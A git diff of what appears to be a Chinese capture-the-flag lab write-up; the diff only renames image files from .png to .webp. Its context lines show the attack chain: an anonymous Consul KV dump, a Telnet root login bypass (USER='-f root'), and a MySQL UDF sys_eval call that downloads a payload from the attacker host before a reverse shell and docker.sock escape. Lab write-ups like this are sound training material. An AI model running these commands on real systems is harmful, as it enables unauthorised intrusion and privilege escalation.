@@ -11,8 +11,8 @@
 | root flag | `473392cd7b2b5ecb49f0f88b61d2ce7e`（宿主机，藏在 MySQL 海豚 ASCII art 里） |
 | 最终路径 | Consul KV → Telnet CVE-2026-24061 → 内网 fscan → MySQL UDF → `docker.sock` 逃逸 → 宿主机 root |
 
-![环境启动](/content/tellme/image-01.png)
-![主机发现](/content/tellme/image-02.png)
+![环境启动](/content/tellme/image-01.webp)
+![主机发现](/content/tellme/image-02.webp)
 
 ## 1. 攻击链概览
 
@@ -68,7 +68,7 @@ nmap -sT -sV -sC -O -p- 192.168.134.72
 
 8500 上的 Consul agent API 可直接访问（ACL 未真正卡住匿名读）。UI 或 API 都能看到数据库相关键：
 
-![Consul KV 泄露](/content/tellme/image-03.png)
+![Consul KV 泄露](/content/tellme/image-03.webp)
 
 ```bash
 curl -s "http://192.168.134.72:8500/v1/kv/?recurse"
@@ -114,7 +114,7 @@ USER='-f root' telnet -a 192.168.134.72 2323
 
 ### 4.2 落地
 
-![Telnet 进 entry_node](/content/tellme/image-04.png)
+![Telnet 进 entry_node](/content/tellme/image-04.webp)
 
 ```text
 Linux 6.12.59-0-lts (entry_node) (pts/0)
@@ -138,7 +138,7 @@ e34a4e9c52fdcf32cc9255cfa6d4087a
 
 入口容器工具链极简，枚举和提权要靠「神奇妙妙工具」：把 **frp**（把内网端口转到 Kali）和 **fscan** 传上去。
 
-![上传工具](/content/tellme/image-05.png)
+![上传工具](/content/tellme/image-05.webp)
 
 ### 5.2 扫 `172.20.0.0/24`
 
@@ -234,7 +234,7 @@ SELECT sys_eval('python2 -c "import urllib;urllib.urlretrieve(\'http://192.168.1
 
 长 SQL 里塞整段逃逸逻辑不好排错，先反弹到 Kali：
 
-![mysql 反弹](/content/tellme/image-06.png)
+![mysql 反弹](/content/tellme/image-06.webp)
 
 ```text
 uid=999(mysql) gid=999(mysql) groups=999(mysql),103(docker_host)
@@ -261,7 +261,7 @@ uid=999(mysql) gid=999(mysql) groups=999(mysql),103(docker_host)
 
 ### 7.4 收割
 
-![写公钥 / 宿主机 root](/content/tellme/image-07.png)
+![写公钥 / 宿主机 root](/content/tellme/image-07.webp)
 
 逃逸容器内：
 
